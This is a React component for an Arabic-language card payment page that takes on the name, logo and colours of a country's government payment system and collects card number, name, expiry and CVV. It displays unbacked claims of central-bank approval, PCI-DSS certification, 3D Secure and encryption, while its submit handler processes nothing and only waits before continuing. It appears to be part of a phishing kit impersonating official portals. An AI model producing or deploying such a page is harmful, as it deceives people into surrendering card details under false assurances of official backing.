import React, { useState } from 'react';
import { Card } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { getGovernmentPaymentSystem } from '@/lib/governmentPaymentSystems';
import { formatCurrency } from '@/lib/countryCurrencies';
import { 
  Shield, 
  Lock, 
  CheckCircle2,
  CreditCard,
  AlertCircle,
  ArrowRight,
  Calendar,
  Info
} from 'lucide-react';

interface GatewayCardPaymentProps {
  countryCode: string;
  amount: number;
  serviceName?: string;
  onBack: () => void;
  onComplete: () => void;
}

export const GatewayCardPayment: React.FC<GatewayCardPaymentProps> = ({ 
  countryCode, 
  amount, 
  serviceName = 'خدمة حكومية',
  onBack,
  onComplete
}) => {
  const govSystem = getGovernmentPaymentSystem(countryCode);
  const [cardNumber, setCardNumber] = useState('');
  const [cardName, setCardName] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const formattedAmount = formatCurrency(amount, countryCode);

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    const formatted = cleaned.match(/.{1,4}/g)?.join(' ') || cleaned;
    return formatted.slice(0, 19);
  };

  const formatExpiryDate = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length >= 2) {
      return `${cleaned.slice(0, 2)}/${cleaned.slice(2, 4)}`;
    }
    return cleaned;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCardNumber(formatCardNumber(e.target.value));
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setExpiryDate(formatExpiryDate(e.target.value));
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 4);
    setCvv(value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);

    await new Promise(resolve => setTimeout(resolve, 2000));
    onComplete();
  };

  const getCardType = (number: string) => {
    const cleaned = number.replace(/\s/g, '');
    if (cleaned.startsWith('4')) return 'Visa';
    if (cleaned.startsWith('5')) return 'Mastercard';
    if (cleaned.startsWith('9')) return 'مدى';
    return null;
  };

  const cardType = getCardType(cardNumber);

  return (
    <div 
      className="min-h-screen" 
      style={{ backgroundColor: govSystem.colors.background }}
      dir="rtl"
    >
      <div 
        className="relative h-28 sm:h-32"
        style={{ background: govSystem.gradients.header }}
      >
        <div className="absolute inset-0 bg-gradient-to-b from-black/20 to-transparent" />
        
        <div className="container mx-auto h-full flex items-center justify-between px-4 sm:px-6 relative z-10">
          <div className="flex items-center gap-3">
            <div 
              className="bg-white p-2 rounded-xl shadow-lg"
              style={{ boxShadow: govSystem.shadows.lg }}
            >
              {govSystem.logo && (
                <img 
                  src={govSystem.logo} 
                  alt={govSystem.nameAr} 
                  className="h-10 sm:h-12 object-contain" 
                />
              )}
            </div>
            <div className="text-white">
              <h1 className="font-bold text-lg sm:text-xl">{govSystem.nameAr}</h1>
              <p className="text-xs opacity-90">الدفع بالبطاقة</p>
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-3 sm:px-4 py-6 sm:py-8">
        <div className="max-w-2xl mx-auto">
          <Card 
            className="p-4 sm:p-8 shadow-2xl"
            style={{ boxShadow: govSystem.shadows.xl }}
          >
            <div className="flex items-center justify-between mb-6 pb-6 border-b-2" style={{ borderBottomColor: govSystem.colors.border }}>
              <div>
                <h2 className="text-xl sm:text-2xl font-bold mb-1">بيانات البطاقة</h2>
                <p className="text-sm text-gray-600">{serviceName}</p>
              </div>
              <div 
                className="px-4 py-2 rounded-xl text-white font-bold text-lg"
                style={{ backgroundColor: govSystem.colors.primary }}
              >
                {formattedAmount}
              </div>
            </div>

            <div 
              className="mb-6 p-4 rounded-xl border-r-4"
              style={{ 
                backgroundColor: `${govSystem.colors.primary}08`,
                borderColor: govSystem.colors.primary 
              }}
            >
              <div className="flex items-start gap-3">
                <Shield className="w-5 h-5 shrink-0 mt-0.5" style={{ color: govSystem.colors.primary }} />
                <div>
                  <p className="font-bold text-sm mb-1">معاملة آمنة ومشفرة</p>
                  <p className="text-xs text-gray-700">
                    جميع معلومات البطاقة محمية بتشفير SSL 256-bit ولن يتم حفظها
                  </p>
                </div>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-5">
              <div>
                <Label htmlFor="cardNumber" className="mb-2 flex items-center gap-2 text-sm font-semibold">
                  <CreditCard className="w-4 h-4" />
                  رقم البطاقة *
                </Label>
                <div className="relative">
                  <Input
                    id="cardNumber"
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    required
                    className="h-12 text-base pr-3 pl-12"
                    style={{ borderColor: govSystem.colors.inputBorder }}
                    placeholder="1234 5678 9012 3456"
                    dir="ltr"
                    maxLength={19}
                  />
                  {cardType && (
                    <div className="absolute left-3 top-1/2 -translate-y-1/2">
                      <Badge 
                        className="text-xs font-semibold"
                        style={{ 
                          backgroundColor: `${govSystem.colors.primary}20`,
                          color: govSystem.colors.primary 
                        }}
                      >
                        {cardType}
                      </Badge>
                    </div>
                  )}
                </div>
                <p className="text-xs text-gray-600 mt-1.5 pr-1">
                  ندعم: Visa, Mastercard, مدى
                </p>
              </div>

              <div>
                <Label htmlFor="cardName" className="mb-2 flex items-center gap-2 text-sm font-semibold">
                  <Info className="w-4 h-4" />
                  الاسم على البطاقة *
                </Label>
                <Input
                  id="cardName"
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value)}
                  required
                  className="h-12 text-base"
                  style={{ borderColor: govSystem.colors.inputBorder }}
                  placeholder="الاسم كما هو مكتوب على البطاقة"
                  dir="ltr"
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="expiry" className="mb-2 flex items-center gap-2 text-sm font-semibold">
                    <Calendar className="w-4 h-4" />
                    تاريخ الانتهاء *
                  </Label>
                  <Input
                    id="expiry"
                    value={expiryDate}
                    onChange={handleExpiryChange}
                    required
                    className="h-12 text-base"
                    style={{ borderColor: govSystem.colors.inputBorder }}
                    placeholder="MM/YY"
                    dir="ltr"
                    maxLength={5}
                  />
                </div>

                <div>
                  <Label htmlFor="cvv" className="mb-2 flex items-center gap-2 text-sm font-semibold">
                    <Lock className="w-4 h-4" />
                    CVV *
                  </Label>
                  <Input
                    id="cvv"
                    type="password"
                    value={cvv}
                    onChange={handleCvvChange}
                    required
                    className="h-12 text-base"
                    style={{ borderColor: govSystem.colors.inputBorder }}
                    placeholder="123"
                    dir="ltr"
                    maxLength={4}
                  />
                </div>
              </div>

              <Separator />

              <div 
                className="p-4 rounded-lg border-2"
                style={{ 
                  backgroundColor: `${govSystem.colors.primary}05`,
                  borderColor: `${govSystem.colors.primary}20`
                }}
              >
                <div className="flex items-start gap-3">
                  <AlertCircle className="w-5 h-5 shrink-0 mt-0.5" style={{ color: govSystem.colors.primary }} />
                  <div className="text-xs text-gray-700 space-y-1">
                    <p>• سيتم خصم المبلغ <strong>{formattedAmount}</strong> من بطاقتك</p>
                    <p>• سيتم إرسال إشعار بالعملية إلى رقم هاتفك المسجل</p>
                    <p>• معتمد من {govSystem.nameAr} والبنك المركزي</p>
                  </div>
                </div>
              </div>

              <div className="flex gap-3 pt-2">
                <Button 
                  type="button"
                  variant="outline"
                  onClick={onBack}
                  className="flex-1 h-12 text-base"
                  disabled={isProcessing}
                >
                  رجوع
                </Button>
                <Button 
                  type="submit"
                  className="flex-1 h-12 text-base font-bold shadow-lg"
                  style={{ 
                    backgroundColor: govSystem.colors.primary,
                    color: govSystem.colors.textOnPrimary
                  }}
                  disabled={isProcessing}
                >
                  {isProcessing ? (
                    <span>جارٍ المعالجة...</span>
                  ) : (
                    <>
                      <span>تأكيد الدفع</span>
                      <ArrowRight className="w-5 h-5 mr-2" />
                    </>
                  )}
                </Button>
              </div>
            </form>
          </Card>

          <div className="mt-4 grid grid-cols-1 sm:grid-cols-3 gap-3">
            <Card className="p-3 bg-green-50 border-green-200">
              <div className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-green-700 shrink-0" />
                <p className="text-xs font-semibold text-green-900">PCI-DSS معتمد</p>
              </div>
            </Card>

            <Card className="p-3 bg-blue-50 border-blue-200">
              <div className="flex items-center gap-2">
                <Lock className="w-4 h-4 text-blue-700 shrink-0" />
                <p className="text-xs font-semibold text-blue-900">SSL 256-bit</p>
              </div>
            </Card>

            <Card className="p-3 bg-purple-50 border-purple-200">
              <div className="flex items-center gap-2">
                <Shield className="w-4 h-4 text-purple-700 shrink-0" />
                <p className="text-xs font-semibold text-purple-900">3D Secure</p>
              </div>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
};

export default GatewayCardPayment;
